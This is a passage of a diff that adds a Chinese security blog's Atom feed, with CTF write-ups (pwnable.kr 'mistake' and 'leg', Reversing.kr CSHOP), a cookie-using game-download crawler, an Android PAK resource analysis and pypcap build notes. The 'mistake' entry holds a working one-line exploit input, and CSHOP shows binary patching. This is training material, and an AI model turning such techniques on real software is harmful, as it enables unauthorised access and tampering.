&lt;+12&gt;:    mov     r0, r3  </code></pre><p>r0等于lr即key3()函数的返回地址0x00008d80。<br>最后得到的值全部相加就得108400。<br><img src="http://t.cn/RGRO9tC" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;先看题目提供的源码；&lt;br&gt;&lt;img src=&quot;http://t.cn/RGROoB4&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;分析后知道只要我们输入的key等于key()、key2()和key3()的值的和就能得到flag。&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;cpp&quot;&gt;key1()+key2()+key3()) == key 
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="challenge" scheme="http://yoursite.com/categories/challenge/"/>
+    
+    
+      <category term="Pwnable" scheme="http://yoursite.com/tags/Pwnable/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Reversing.kr CSHOP</title>
+    <link href="http://yoursite.com/posts/1bb8fcd6.html"/>
+    <id>http://yoursite.com/posts/1bb8fcd6.html</id>
+    <published>2016-02-15T08:43:09.000Z</published>
+    <updated>2018-04-04T16:57:40.423Z</updated>
+    
+    <content type="html"><![CDATA[<p>CSHOP为C#编写的程序,运行改程序<br><img src="http://t.cn/RGRNJgI" alt=""><br>窗口什么东西也没有，拖进dnspy分析源码。在源码中，程序定义了一个按钮和几个标签。注册了一个按钮事件就没有其他了。</p><a id="more"></a><p>但是我们在运行的窗口中并没有看到按钮，如果仔细再看下源码，你就会发现如下图的代码。<br><img src="http://t.cn/RGRNXt4" alt=""><br>这个button的大小被设置成0了。难怪我们看不到了。我们修改此处的IL指令，修改0的值。这里我就改成20 和30了。<br><img src="http://t.cn/RGRNScy" alt=""></p><p>修改完成后，点击File-SaveAll保存所有的修改，文件名需要和拖进dnspy的文件 不一样。因为后者是被占用无法修改。<br><img src="http://t.cn/RGRNCUJ" alt=""><br>打开修改后的文件，点击按钮就会在下面出现flag。<br><img src="http://t.cn/RGRNp74" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;CSHOP为C#编写的程序,运行改程序&lt;br&gt;&lt;img src=&quot;http://t.cn/RGRNJgI&quot; alt=&quot;&quot;&gt;&lt;br&gt;窗口什么东西也没有，拖进dnspy分析源码。在源码中，程序定义了一个按钮和几个标签。注册了一个按钮事件就没有其他了。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="challenge" scheme="http://yoursite.com/categories/challenge/"/>
+    
+    
+      <category term="Reversing" scheme="http://yoursite.com/tags/Reversing/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python爬虫实战:Oculus VR</title>
+    <link href="http://yoursite.com/posts/84f4a8fe.html"/>
+    <id>http://yoursite.com/posts/84f4a8fe.html</id>
+    <published>2016-02-15T02:41:09.000Z</published>
+    <updated>2018-04-14T09:35:06.962Z</updated>
+    
+    <content type="html"><![CDATA[<p>帮朋友写的一个爬虫，爬一个网站的所有VR游戏。在这之前我都还不知道还有这个VR(虚拟现实)游戏。我也是通过写这个爬虫才学会pycurl+BeautifulSoup 的用法。</p><h2 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h2><p>我使用的是第三方模块pycurl+BeautifulSoup。需要另外安装这两个模块，不然脚本无法运行，会报错。</p><p><strong>BeautifulSoup</strong>:<a href="http://beautifulsoup.readthedocs.org/zh_CN/latest/#" title="中文文档" target="_blank" rel="noopener">中文文档</a><br><strong>pycurl</strong>:<a href="http://pycurl.sourceforge.net/download/" title="下载地址" target="_blank" rel="noopener">下载地址</a>选择对应的版本下载安装。</p><h2 id="开始编写爬虫"><a href="#开始编写爬虫" class="headerlink" title="开始编写爬虫"></a>开始编写爬虫</h2><p>开始之前我们先分析下我们需要爬的内容。我们要的是每个游戏的真实下载地址。</p><p><img src="http://t.cn/RGRNRtu" alt=""></p><p>既然是下载所有的游戏，我们就得知道每一页的网址，在这里 <a href="http://d.87870.com/xiazai-2-0603-1_.html" target="_blank" rel="noopener">http://d.87870.com/xiazai-2-0603-1_.html</a> ，<br>xiazai-2 这里的2是页数，知道了总页数我们就可以爬出所有页的每个游戏点击立即下载后跳转到的游戏下载页面。<br><img src="http://t.cn/RGRNni7" alt=""><br>如上图，点击游戏下载就可以下载游戏。但是没有登录的话是不让你下载的，这就要我们写脚本时要用到cookie。<br><img src="http://t.cn/RGRNusg" alt=""></p><p>大概思路就是这样了。开始写代码。<br><a id="more"></a><br>我用pycurl封装了一个函数</p><pre><code class="python">def GetData(url, ProxyIP=None,reffer=None,cookie=None):    b = StringIO.StringIO()    c = pycurl.Curl()    c.setopt(pycurl.WRITEFUNCTION, b.write)    c.setopt(pycurl.USERAGENT, &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0&quot;)    c.setopt(pycurl.URL, url)    if ProxyIP:        c.setopt(pycurl.PROXY,ProxyIP)    if cookie:        c.setopt(pycurl.COOKIEFile,cookiefile) #使用 firebug导出的cookie文件    if reffer:        c.setopt(pycurl.REFERER,reffer)    c.perform()    return b.getvalue()</code></pre><p>用来获取网络数据，</p><h3 id="获取总页数"><a href="#获取总页数" class="headerlink" title="获取总页数"></a>获取总页数</h3><p>使用firebug分析游戏目录页最下方的页数，html代码如下。</p><pre><code class="html">&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt;  &lt;div class=&quot;pageNav&quot;&gt;    &lt;a href=&quot;xiazai-1-0603-1_.html&quot;&gt;首页&lt;/a&gt;    &lt;a href=&quot;xiazai-7-0603-1_.html&quot;&gt;上一页&lt;/a&gt;    &lt;a href=&quot;xiazai-3-0603-1_.html&quot;&gt;3&lt;/a&gt;    &lt;a href=&quot;xiazai-4-0603-1_.html&quot;&gt;4&lt;/a&gt;    &lt;a href=&quot;xiazai-5-0603-1_.html&quot;&gt;5&lt;/a&gt;    &lt;a href=&quot;xiazai-6-0603-1_.html&quot;&gt;6&lt;/a&gt;    &lt;a href=&quot;xiazai-7-0603-1_.html&quot;&gt;7&lt;/a&gt;    &lt;a class=&quot;current&quot;&gt;8&lt;/a&gt;    &lt;a href=&quot;xiazai-9-0603-1_.html&quot;&gt;9&lt;/a&gt;    &lt;a href=&quot;xiazai-10-0603-1_.html&quot;&gt;10&lt;/a&gt;    &lt;a href=&quot;xiazai-11-0603-1_.html&quot;&gt;11&lt;/a&gt;    &lt;a href=&quot;xiazai-12-0603-1_.html&quot;&gt;12&lt;/a&gt;    &lt;a href=&quot;xiazai-9-0603-1_.html&quot;&gt;下一页&lt;/a&gt;    &lt;a href=&quot;xiazai-60-0603-1_.html&quot;&gt;尾页&lt;/a&gt;    &lt;em&gt;共60页&lt;/em&gt;   &lt;/div&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>总页数就是60页，编写python代码如下：</p><pre><code class="python">def GetPageCount(url):    data = GetData(url)    soup = BeautifulSoup(data)    da = soup.select(&#39;.pageNav&#39;)    page = re.findall(u&quot;共(.*?)页&quot;, da[0].text)[0]    return page</code></pre><h2 id="获取游戏下载页面"><a href="#获取游戏下载页面" class="headerlink" title="获取游戏下载页面"></a>获取游戏下载页面</h2><p>现在已经知道有多少页了，随便找一页查看html源码。</p><pre><code class="html"> &lt;li&gt;&lt;a href=&quot;xiazainr-6299.html&quot; target=&quot;_blank&quot; title=&quot;超级涡轮·忍者兔（Super Turbo Atomic Ninja Rabbit Experience）&quot;&gt;                                        &lt;img src=&quot;http://pic.87870.com/upload/images/vr87870/2015/9/16/th_170x170_339d0126-f4c3-44f4-921e-0ff9f57534cb.jpg&quot; alt=&quot;超级涡轮·忍者兔（Super Turbo Atomic Ninja Rabbit Experience）&quot;&gt;                                        &lt;/a&gt;                                        &lt;div class=&quot;content&quot;&gt;                                            &lt;p class=&quot;title&quot;&gt;&lt;a href=&quot;xiazainr-6299.html&quot; target=&quot;_blank&quot; title=&quot;超级涡轮·忍者兔（Super Turbo Atomic Ninja Rabbit Experience）&quot;&gt;超级涡轮·忍者兔（Super Turbo Atomic Ninja Rabbit Experience）&lt;/a&gt;&lt;/p&gt;                                            &lt;p&gt;2015-09-16 | 633.85M&lt;/p&gt;                                            &lt;p&gt;类型：Oculus Rift适配&lt;/p&gt;                                            &lt;p&gt;适配：Oculus DK2&lt;/p&gt;                                            &lt;p&gt;外设：无&lt;/p&gt;                                            &lt;p class=&quot;link&quot;&gt;                                                下载方式：免费                                            &lt;/p&gt;                                            &lt;a href=&quot;xiazainr-6299.html&quot; class=&quot;download_btn&quot; target=&quot;_blank&quot;&gt;立即下载&lt;/a&gt;                                        &lt;/div&gt;                                    &lt;/li&gt;                                    &lt;li&gt;&lt;a href=&quot;xiazainr-6296.html&quot; target=&quot;_blank&quot; title=&quot;冰箱历险记（Boursin Sensorium Virtual Reality Experience）&quot;&gt;                                        &lt;img src=&quot;http://pic.87870.com/upload/images/vr87870/2015/9/16/th_170x170_dbc06a5e-4e19-4c81-a457-1f9c2353f59e.jpg&quot; alt=&quot;冰箱历险记（Boursin Sensorium Virtual Reality Experience）&quot;&gt;                                        &lt;/a&gt;                                        &lt;div class=&quot;content&quot;&gt;                                            &lt;p class=&quot;title&quot;&gt;&lt;a href=&quot;xiazainr-6296.html&quot; target=&quot;_blank&quot; title=&quot;冰箱历险记（Boursin Sensorium Virtual Reality Experience）&quot;&gt;冰箱历险记（Boursin Sensorium Virtual Reality Experience）&lt;/a&gt;&lt;/p&gt;                                            &lt;p&gt;2015-09-16 | 821.64M&lt;/p&gt;                                            &lt;p&gt;类型：单机&lt;/p&gt;                                            &lt;p&gt;适配：Oculus Rift&lt;/p&gt;                                            &lt;p&gt;外设：无&lt;/p&gt;                                            &lt;p class=&quot;link&quot;&gt;                                                下载方式：60幸福币                                            &lt;/p&gt;                                            &lt;a href=&quot;xiazainr-6296.html&quot; class=&quot;download_btn&quot; target=&quot;_blank&quot;&gt;立即下载&lt;/a&gt;                                        &lt;/div&gt;                                    &lt;/li&gt;</code></pre><p>发现游戏下载页面都在这个位置，</p><pre><code class="html">&lt;a href=&quot;xiazainr-6296.html&quot; class=&quot;download_btn&quot; target=&quot;_blank&quot;&gt;立即下载&lt;/a&gt;</code></pre><p>编写代码如下：</p><pre><code class="python">def GetGameDownloadPage(url):    DownloadPageList = []    data = GetData(url)    soup = BeautifulSoup(data)    da   = soup.select(&quot;.download_btn&quot;)    for u in da:        DownloadPageList.append(&#39;http://d.87870.com/&#39;+u[&#39;href&#39;])    return DownloadPageList</code></pre><p>每一页有很多游戏，返回这一页所有游戏的下载页面。</p><p>游戏下载页面的源码如下：</p><pre><code class="html">&lt;div class=&quot;topic relative&quot;&gt;                    &lt;h1&gt;恐怖医院(THE HOSPITAL HAUNTED BE LOST)&lt;/h1&gt;                    &lt;div class=&quot;comment relative&quot;&gt;                        &lt;i&gt;&lt;/i&gt;                        &lt;p class=&quot;overflow&quot;&gt;小编简评：《恐怖医院（THE HOSPITAL HAUNTED BE LOST）》是由MAD虚拟现实工作室开发，这个团队来自泰国最古老且最有名望的私立大学&amp;mdash;&amp;mdash;泰国斯巴顿大学。该工作室将泰国本土恐怖元素和VR游戏融合在一起，光从恐怖惊悚氛围上已经达到了上乘之作。                        &lt;/p&gt;                    &lt;/div&gt;                    &lt;div class=&quot;info&quot;&gt;                        &lt;p&gt;                            游戏类型：&lt;strong class=&quot;fd3939&quot;&gt;Oculus DK2&lt;/strong&gt;游戏大小：&lt;strong class=&quot;fd3939&quot;&gt;366.69M&lt;/strong&gt;适配眼镜：&lt;strong class=&quot;fd3939&quot;&gt;DK2&lt;/strong&gt;                        &lt;/p&gt;                        &lt;p&gt;                            操作系统：&lt;strong class=&quot;fd3939&quot;&gt;Windows7&lt;/strong&gt;更新时间：&lt;strong class=&quot;fd3939&quot;&gt;2016-04-13&lt;/strong&gt; 下载方式：60幸福币                        &lt;/p&gt;                    &lt;/div&gt;                    &lt;div class=&quot;for_download clearfix&quot;&gt;                        &lt;a class=&quot;download&quot; href=&quot;http://d.87870.com/dl.aspx?id=9972&quot;&gt;游戏下载&lt;/a&gt;</code></pre><p>游戏下载地址在最后一行。访问这个地址会重定向到游戏的真实下载地址。</p><pre><code class="python"># 得到游戏的下载地址def GetGameDownloadURL(pageURL):    data = GetData(pageURL)    soup = BeautifulSoup(data)    try:        da = soup.select(&quot;.download&quot;)    except Exception,e:        pass    return da[0][&#39;href&#39;]</code></pre><p>直接使用pycurl下载游戏时会丢包，因为文件比较大，需要pycurl分块下载。最后main函数如下，我只是获取了每个游戏的真实下载地址。</p><pre><code class="python">def main():    downloadPageList = []    count = GetPageCount(&#39;http://d.87870.com/xiazai-1-0603-1_.html&#39;)    #获取所有页的游戏下载页面    for page in range(1,int(count)):        url = &#39;http://d.87870.com/xiazai-%d-0603-1_.html&#39;% page        downloadPageList.extend(GetGameDownloadPage(url))    for u in downloadPageList:        downurl = GetGameDownloadURL(u)        data = GetData(downurl,reffer=u)        if &quot;store.steampowered.com&quot; in data:            continue        GameURL = re.findall(&#39;&lt;a href=\&quot;(.*?)\&quot;&gt;here&#39;,data,re.S)[0]</code></pre><p>最后附上完整的代码：<a href="https://github.com/ydc1992/pytho-script/blob/master/VR%282%29.py" title="github" target="_blank" rel="noopener">github</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;帮朋友写的一个爬虫，爬一个网站的所有VR游戏。在这之前我都还不知道还有这个VR(虚拟现实)游戏。我也是通过写这个爬虫才学会pycurl+BeautifulSoup 的用法。&lt;/p&gt;&lt;h2 id=&quot;安装模块&quot;&gt;&lt;a href=&quot;#安装模块&quot; class=&quot;headerlink&quot; title=&quot;安装模块&quot;&gt;&lt;/a&gt;安装模块&lt;/h2&gt;&lt;p&gt;我使用的是第三方模块pycurl+BeautifulSoup。需要另外安装这两个模块，不然脚本无法运行，会报错。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;BeautifulSoup&lt;/strong&gt;:&lt;a href=&quot;http://beautifulsoup.readthedocs.org/zh_CN/latest/#&quot; title=&quot;中文文档&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;中文文档&lt;/a&gt;&lt;br&gt;&lt;strong&gt;pycurl&lt;/strong&gt;:&lt;a href=&quot;http://pycurl.sourceforge.net/download/&quot; title=&quot;下载地址&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;下载地址&lt;/a&gt;选择对应的版本下载安装。&lt;/p&gt;&lt;h2 id=&quot;开始编写爬虫&quot;&gt;&lt;a href=&quot;#开始编写爬虫&quot; class=&quot;headerlink&quot; title=&quot;开始编写爬虫&quot;&gt;&lt;/a&gt;开始编写爬虫&lt;/h2&gt;&lt;p&gt;开始之前我们先分析下我们需要爬的内容。我们要的是每个游戏的真实下载地址。&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;http://t.cn/RGRNRtu&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;既然是下载所有的游戏，我们就得知道每一页的网址，在这里 &lt;a href=&quot;http://d.87870.com/xiazai-2-0603-1_.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://d.87870.com/xiazai-2-0603-1_.html&lt;/a&gt; ，&lt;br&gt;xiazai-2 这里的2是页数，知道了总页数我们就可以爬出所有页的每个游戏点击立即下载后跳转到的游戏下载页面。&lt;br&gt;&lt;img src=&quot;http://t.cn/RGRNni7&quot; alt=&quot;&quot;&gt;&lt;br&gt;如上图，点击游戏下载就可以下载游戏。但是没有登录的话是不让你下载的，这就要我们写脚本时要用到cookie。&lt;br&gt;&lt;img src=&quot;http://t.cn/RGRNusg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;大概思路就是这样了。开始写代码。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="python" scheme="http://yoursite.com/categories/python/"/>
+    
+    
+      <category term="爬虫" scheme="http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>pwnable.kr mistake</title>
+    <link href="http://yoursite.com/posts/f6e7b5bf.html"/>
+    <id>http://yoursite.com/posts/f6e7b5bf.html</id>
+    <published>2016-01-31T15:34:20.000Z</published>
+    <updated>2018-04-04T16:57:40.434Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="http://t.cn/RGRNYlx" alt=""></p><p>分析源码，发现下面这段代码有点可疑。</p><pre><code>fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code></pre><p>熟悉Linux的童鞋都知道文件描述符是不可能小于0的。计算得fd等于0，因为”&lt;”比”=”优先级高，先计算等式右边，打开的文件描述符不可能小于0，因此右边等式等于0，最后fd=0；<br>文件描述符为0是标准输入，也就是说这个程序实际上并没有读取password文件，而是从标准输入中读取数据。</p><p>继续往下看，有个比较，两个buff相等则输出flag。</p><pre><code class="cpp">if(!strncmp(pw_buf, pw_buf2, PW_LEN)){           printf(&quot;Password OK\n&quot;);                 system(&quot;/bin/cat flag\n&quot;);         }                                          </code></pre><p>这样，我们只要构造一个满足条件的buffer通过管道传给mistake。buffer满足下面这个条件就能成功拿到key。</p><pre><code class="c">pw_buf = pw_buf2^0x1111111111</code></pre><p>执行如下命令。</p><pre><code class="bash">(python -c &quot;print &#39;\x12&#39;*10 + &#39;\x13&#39;*10 &quot;) | ./mistake</code></pre><p><img src="http://t.cn/RGRNH93" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;img src=&quot;http://t.cn/RGRNYlx&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;分析源码，发现下面这段代码有点可疑。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;fd=open(&amp;quot;/home/mistake/password&amp;quot;,O_RDONLY,0400) &amp;
+      
+    
+    </summary>
+    
+      <category term="challenge" scheme="http://yoursite.com/categories/challenge/"/>
+    
+    
+      <category term="Pwnable" scheme="http://yoursite.com/tags/Pwnable/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>安卓游戏资源解密</title>
+    <link href="http://yoursite.com/posts/9e24c54e.html"/>
+    <id>http://yoursite.com/posts/9e24c54e.html</id>
+    <published>2016-01-31T12:11:59.000Z</published>
+    <updated>2018-04-04T16:57:40.443Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="安卓游戏资源解密"><a href="#安卓游戏资源解密" class="headerlink" title="安卓游戏资源解密"></a>安卓游戏资源解密</h1><p>一个同学在群里发了个游戏，要解密游戏的资源。反编译看了下源码，没看出什么，用Android Killer看了下资源，发现在res/raw目录下有个文件比较大，t0.zip解压后有t0.pak;文件有点大，3M多，并且是以PAK格式的文 件，通过搜索得知这个格式为PAK格式——是一种文件打包的格式。</p><p><img src="http://t.cn/RGRCrxm" alt=""></p><p>在网上搜了下 打开PAK文件的软件，发现都不能打开。 搞不定就不搞了。</p><p>这几天看了 &lt;&lt;揭秘数据解密的关键技术&gt;&gt;，下面图片框框内的像文件名，我们可以知道这个文件是一种文件打包的格式。具体是什么结构不知道。<br><img src="http://t.cn/RGRCgpS" alt=""></p><a id="more"></a><p>解析文件推荐使用010 editor，写文件解析模板方便分析。</p><p>我们可以看出第一个文件名从0xA开始， 对比每个文件名，发现名字前面的一字节数据表示这个文件名字符串的长度，前面8个字符未知，每两个字符串之间差8个数据，我们可以利用010 editor的模板功能写一个模板文件。</p><p>前8字节的数据暂时定义成结构</p><pre><code class="c"> typedef struct unkown{    char  unk[8];}</code></pre><p>包含文件名的数据定义成</p><pre><code class="bash">typedef struct{     BYTE  FilenameLen;     char  Filename[nameLen];     char  unkonw[8];   //未知数据}FILE_LIST;</code></pre><p><img src="http://t.cn/RGRCkDz" alt=""></p><p>找到最后一个文件名的字符串</p><p><img src="http://t.cn/RGRNhLS" alt=""></p><p>然后不断的改变模板文件中i的值计算总共有多少个文件名，最后算出有总共有292个文件名。发现开头的四字节数据刚好为292，因此可以判断该数据为文件的个数。模板文件改写代码</p><pre><code class="bash">typedef struct{int FileNum;int unk;}PAK;typedef struct{     BYTE  nameLen;     char  name[nameLen];     CHAR  unk[8];}FILE_LIST;/////////////////////////////LittleEndian();PAK pak;FSeek(0x8);local int i;for(i=0;i&lt;pak.FileNum;i++){    FILE_LIST fileList;  };</code></pre><p>继续分析最后一个文件名后面的数据。后面的数据的起止地址0x2D80h.<br><img src="http://t.cn/RqtewpY" alt=""></p><p><img src="http://t.cn/RqteUgm" alt=""></p><p>而第一个FileList结构(模板文件定义的那个结构)的unk字段的第一个4字节为0x2d80;可以判断Unk的前四个字节为偏移地址，比较 多个FileLidy结构，可以发现相邻两个FIleList结构的 unk字段的前4字节刚好就是相邻两个FileList结构unk字段指向的数据之差。</p><p>模板文件现在修改为</p><pre><code class="cpp">typedef struct{      int fileNum;      int unknow2;    }PAK;typedef struct{     BYTE  nameLen;     char  name[nameLen];     int   fileoff&lt;format=hex&gt;;     int   filesize&lt;format=hex&gt;;}FILE_LIST;/////////////////////////////LittleEndian();PAK pak;FSeek(0x8);local int i;for(i=0;i&lt;pak.fileNum;i++){    FILE_LIST fileList;};</code></pre><p>随便找一个文件名查看</p><p><img src="http://t.cn/RGRNAnc" alt=""></p><p>后缀spritr文件名的文件头SPRX，可以知道该数据为这个文件的数据，并且没有加密。</p><p>资源中最重要的是图片，这里面最多的就是PNG图片，查看数据时文件头并不是PNG，而是RIFF文件头。用图片浏览器也打不开，通过搜索得知这是一种比较新的文件格式，查阅资料知道XnView支持这个文件格式。</p><p><img src="http://t.cn/RGRNyz4" alt=""></p><p>用XnView打开的图像就是</p><p><img src="http://t.cn/RGRNboR" alt=""></p><p>解密到此就差不多，接下来就是写个小程序把资源都提取出来了。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;安卓游戏资源解密&quot;&gt;&lt;a href=&quot;#安卓游戏资源解密&quot; class=&quot;headerlink&quot; title=&quot;安卓游戏资源解密&quot;&gt;&lt;/a&gt;安卓游戏资源解密&lt;/h1&gt;&lt;p&gt;一个同学在群里发了个游戏，要解密游戏的资源。反编译看了下源码，没看出什么，用Android Killer看了下资源，发现在res/raw目录下有个文件比较大，t0.zip解压后有t0.pak;文件有点大，3M多，并且是以PAK格式的文 件，通过搜索得知这个格式为PAK格式——是一种文件打包的格式。&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;http://t.cn/RGRCrxm&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;在网上搜了下 打开PAK文件的软件，发现都不能打开。 搞不定就不搞了。&lt;/p&gt;&lt;p&gt;这几天看了 &amp;lt;&amp;lt;揭秘数据解密的关键技术&amp;gt;&amp;gt;，下面图片框框内的像文件名，我们可以知道这个文件是一种文件打包的格式。具体是什么结构不知道。&lt;br&gt;&lt;img src=&quot;http://t.cn/RGRCgpS&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Android" scheme="http://yoursite.com/categories/Android/"/>
+    
+    
+      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>pypcap模块安装</title>
+    <link href="http://yoursite.com/posts/6e7365c5.html"/>
+    <id>http://yoursite.com/posts/6e7365c5.html</id>
+    <published>2016-01-30T13:55:50.000Z</published>
+    <updated>2018-04-04T16:57:40.437Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近需要用python写一个数据包分析的工具，需要用到pypcap。在Linxu可以直接用pip install pypcap直接安装成功，但是在windows一直提示缺少<code>pcap.h</code>头文件。在网上找了很多资料，终于编译成功了。</p><h2 id="编译之前"><a href="#编译之前" class="headerlink" title="编译之前"></a>编译之前</h2><p>在编译之前我们需要准备如下</p><ul><li>pypcap源码 <a href="https://github.com/dugsong/pypcap" target="_blank" rel="noopener">https://github.com/dugsong/pypcap</a></li><li>WinPcap源码 <a href="https://www.winpcap.org/devel.htm" target="_blank" rel="noopener">https://www.winpcap.org/devel.htm</a></li><li>安装pyrex <a href="http://brl.thefreecat.org/python-pyrex/" target="_blank" rel="noopener">http://brl.thefreecat.org/python-pyrex/</a></li><li>MiniGw <a href="http://www.mingw.org/" target="_blank" rel="noopener">http://www.mingw.org/</a></li></ul><p>pycurl如何安装在<a href="https://github.com/dugsong/pypcap/blob/master/INSTALL" target="_blank" rel="noopener">https://github.com/dugsong/pypcap/blob/master/INSTALL</a> 的<code>Building under Windows</code>也有详细说明。<br><a id="more"></a></p><h2 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h2><ol><li><p>编辑 <code>C:\Python26\Lib\distutils\distutils.cfg</code>文件，没有则自己创建一个。往里面添加内容如下：</p><pre><code class="bash"> [build] compiler = mingw32</code></pre></li><li><p>将我们下载好的pypcap源码和WinPcap源码分别解压到<code>c:\pypcap</code>和 <code>c:\wpdpack</code>.编辑pypcap源码的makefile文件。将下面这段代码前面的注释去掉</p><pre><code class="bash">CONFIG_ARGS = --with-pcap=..\\wpdpack</code></pre><p>从这我们可以看出这里通过跳转到上一层目录到wpdpack目录，也就是为什么我们要把pypcap和winpcap的源码放在同一个目录里，当然你也可以修改makefile执行你的winpcap目录所在路径</p></li></ol><p>同时将</p><pre><code class="bash">pyrexc pcap.pyx</code></pre><p>改成</p><pre><code class="bash">$(PYTHON) c:\Python27\Scripts\pyrexc.py pcap.pyx  </code></pre><p>另一种方法就是将python安装路径和该目录下Scripts目录加入环境变量，也就不需要改这行了。</p><ol start="3"><li>运行<code>mingw32-make</code>和 <code>mingw32-make install</code> 就能成功编译成功了。</li></ol>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近需要用python写一个数据包分析的工具，需要用到pypcap。在Linxu可以直接用pip install pypcap直接安装成功，但是在windows一直提示缺少&lt;code&gt;pcap.h&lt;/code&gt;头文件。在网上找了很多资料，终于编译成功了。&lt;/p&gt;&lt;h2 id=&quot;编译之前&quot;&gt;&lt;a href=&quot;#编译之前&quot; class=&quot;headerlink&quot; title=&quot;编译之前&quot;&gt;&lt;/a&gt;编译之前&lt;/h2&gt;&lt;p&gt;在编译之前我们需要准备如下&lt;/p&gt;&lt;ul&gt;&lt;li&gt;pypcap源码 &lt;a href=&quot;https://github.com/dugsong/pypcap&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/dugsong/pypcap&lt;/a&gt;&lt;/li&gt;&lt;li&gt;WinPcap源码 &lt;a href=&quot;https://www.winpcap.org/devel.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.winpcap.org/devel.htm&lt;/a&gt;&lt;/li&gt;&lt;li&gt;安装pyrex &lt;a href=&quot;http://brl.thefreecat.org/python-pyrex/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://brl.thefreecat.org/python-pyrex/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;MiniGw &lt;a href=&quot;http://www.mingw.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.mingw.org/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;pycurl如何安装在&lt;a href=&quot;https://github.com/dugsong/pypcap/blob/master/INSTALL&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/dugsong/pypcap/blob/master/INSTALL&lt;/a&gt; 的&lt;code&gt;Building under Windows&lt;/code&gt;也有详细说明。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="python" scheme="http://yoursite.com/categories/python/"/>
+    
+    
+      <category term="pypcap" scheme="http://yoursite.com/tags/pypcap/"/>
+    
+  </entry>
+  
+</feed>
